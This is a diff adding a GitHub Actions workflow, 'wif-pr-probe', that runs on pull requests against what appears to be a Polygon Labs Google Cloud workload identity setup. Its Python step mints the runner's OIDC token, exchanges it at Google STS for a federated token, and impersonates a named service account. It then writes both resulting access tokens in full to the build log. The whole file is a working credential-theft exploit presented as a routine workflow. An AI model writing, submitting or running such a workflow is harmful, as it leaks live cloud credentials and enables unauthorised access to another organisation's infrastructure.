@@ -1,0 +1,66 @@
+name: wif-pr-probe
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        env:
+          PROV: "projects/198945073119/locations/global/workloadIdentityPools/prj-polygonlabs-pos-v1-dev/providers/oi-prj-polygonlabs-pos-v1-dev"
+          SA: "prj-polygonlabs-pos-v1-dev-sa@prj-polygonlabs-pos-v1-dev.iam.gserviceaccount.com"
+        run: |
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.error, urllib.parse
+
+          def log(k, v=None):
+              print((k if v is None else "%s=%s" % (k, v)), flush=True)
+
+          def http(method, url, data=None, token=None, timeout=45):
+              body = json.dumps(data).encode() if isinstance(data, (dict, list)) else None
+              req = urllib.request.Request(url, data=body, method=method)
+              if token:
+                  req.add_header("Authorization", "Bearer " + token)
+              if body is not None:
+                  req.add_header("Content-Type", "application/json")
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as r:
+                      return r.status, json.loads(r.read().decode() or "{}")
+              except urllib.error.HTTPError as e:
+                  return e.code, {"_raw": e.read().decode("utf-8", "replace")[:1200]}
+              except Exception as e:
+                  return 0, {"_err": str(e)[:200]}
+
+          u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+          t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
+          prov = os.environ["PROV"]; sa = os.environ.get("SA", "")
+          if not u:
+              log("NO_OIDC_URL"); raise SystemExit(0)
+          st, j = http("GET", u + ("&" if "?" in u else "?") + "audience=" + urllib.parse.quote("//iam.googleapis.com/" + prov, safe=""), token=t)
+          idt = j.get("value", "") if isinstance(j, dict) else ""
+          log("MINT_HTTP", st); log("MINT_LEN", len(idt))
+          if idt:
+              pad = idt.split(".")[1]; pad += "=" * (-len(pad) % 4)
+              log("CLAIMS", base64.urlsafe_b64decode(pad).decode("utf-8", "replace")[:1200])
+          st, sj = http("POST", "https://sts.googleapis.com/v1/token", data={
+              "audience": "//iam.googleapis.com/" + prov,
+              "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
+              "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
+              "scope": "https://www.googleapis.com/auth/cloud-platform",
+              "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
+              "subjectToken": idt})
+          log("STS_HTTP", st); log("STS", json.dumps(sj)[:400])
+          fed = sj.get("access_token") if isinstance(sj, dict) else None
+          if not fed: raise SystemExit(0)
+          log("FED", fed)
+          if sa:
+              st, gj = http("POST", "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + urllib.parse.quote(sa, safe="") + ":generateAccessToken",
+                            token=fed, data={"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "3600s"})
+              log("GAT_HTTP", st); log("GAT", json.dumps(gj)[:400])
+              at = gj.get("accessToken") if isinstance(gj, dict) else None
+              if at: log("AT", at)
+          log("DONE")
+          PY
